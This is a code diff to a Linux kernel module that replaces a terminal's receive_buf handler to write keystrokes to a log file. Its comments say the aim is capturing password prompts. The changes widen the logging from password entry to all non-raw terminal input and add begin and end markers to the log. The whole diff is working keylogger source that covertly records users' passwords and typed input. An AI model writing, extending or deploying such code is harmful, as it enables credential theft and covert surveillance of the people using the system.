@@ -21,13 +21,16 @@ void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
 // our replacement receive_buf
 void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
 		     char* fp, int count){
+
   // we check if echoing is disabled. If it is,
   // then it is probably a password prompt and we
   // want to log it
-  if(L_ICANON(tty) && !L_ECHO(tty)){
+
+  // ignore raw mode
+  if(!tty->raw && !tty->real_raw){
+    //if(L_ICANON(tty) && !L_ECHO(tty)) to check for passwd prompts
     // if we have a single character
     if(count == 1){
-      printk(KERN_ALERT "buffer is %c\n",cp[0]);
       if(logfile) kwrite(logfile,0,cp,count*sizeof(char));
     }
     if(count > 0 && count != 1){
@@ -48,6 +51,11 @@ static int init(void) {
   file = kopen(dev_name,LF_FLAGS,LF_PERMS);
   // open our logfile
   logfile = kopen(LF_PATH,LF_FLAGS,LF_PERMS);
+
+  // init out log file
+  char* init_message = "-----beginning of log entry-----\n";
+  if(logfile) kwrite(logfile,0,init_message,33);
+
   if(file){
     printk(KERN_ALERT "tty was opened\n");
     struct tty_file_private* priv = NULL;
@@ -68,6 +76,8 @@ static int init(void) {
 	 
 static void exit(void) {
   // close our log file
+  char* exit_message = "-----end of log entry-----\n";
+  if(logfile) kwrite(logfile,0,exit_message,27);
   if(logfile) kclose(logfile);
   // our structs
   struct tty_struct* tty = NULL;
